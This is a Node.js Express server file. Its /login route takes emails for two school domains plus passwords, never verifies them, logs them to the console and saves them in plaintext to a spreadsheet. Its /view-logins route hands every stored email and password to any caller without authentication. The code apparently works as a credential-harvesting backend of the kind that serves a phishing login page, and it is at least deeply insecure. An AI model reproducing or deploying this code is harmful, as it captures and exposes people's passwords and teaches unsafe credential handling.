const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const XLSX = require('xlsx');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json());

let activeSessions = {};  // Store active sessions by email

const filePath = path.join(__dirname, 'logins.xlsx'); 

app.post('/login', (req, res) => {
  const { email, password } = req.body;

  // Validate email domain to allow both domains
  const validDomains = ['@stfrancis.ph.education', '@stfrancis.edu.com'];
  const isValidDomain = validDomains.some(domain => email.endsWith(domain));

  if (!isValidDomain) {
    return res.json({ status: 'error', message: 'Invalid email domain. Please use your @stfrancis.edu.com or @stfrancis.ph.education email.' });
  }

  // Check if user is already logged in
  if (activeSessions[email]) {
    return res.json({ status: 'already_logged_in', message: 'User already logged in.' });
  }

  console.log("Saving login data:", { email, password });
  activeSessions[email] = true;

  let workbook;
  try {
    workbook = XLSX.readFile(filePath);
  } catch (err) {
    workbook = XLSX.utils.book_new();
  }

  const sheetName = 'Logins';
  let worksheet = workbook.Sheets[sheetName];
  if (!worksheet) {
    worksheet = XLSX.utils.aoa_to_sheet([["Email", "Password", "Timestamp"]]);
    XLSX.utils.book_append_sheet(workbook, worksheet, sheetName);
  }

  const timestamp = new Date().toISOString();
  const newRow = [email, password, timestamp];
  XLSX.utils.sheet_add_aoa(worksheet, [newRow], { origin: -1 });

  try {
    XLSX.writeFile(workbook, filePath);
    res.json({ status: 'success', message: 'Login data saved successfully.' });
  } catch (err) {
    res.json({ status: 'error', message: 'Error saving login data' });
  }
});

app.get('/view-logins', (req, res) => {
  let workbook;
  try {
    workbook = XLSX.readFile(filePath);
  } catch (err) {
    return res.json({ status: 'error', message: 'Error reading login data' });
  }

  const sheetName = 'Logins';
  const worksheet = workbook.Sheets[sheetName];
  if (!worksheet) {
    return res.json({ status: 'error', message: 'No login data found' });
  }

  const loginData = XLSX.utils.sheet_to_json(worksheet, { header: 1 });
  loginData.shift();

  res.json({ status: 'success', data: loginData });
});

app.listen(3000, () => {
  console.log('Server running on http://localhost:3000');
});
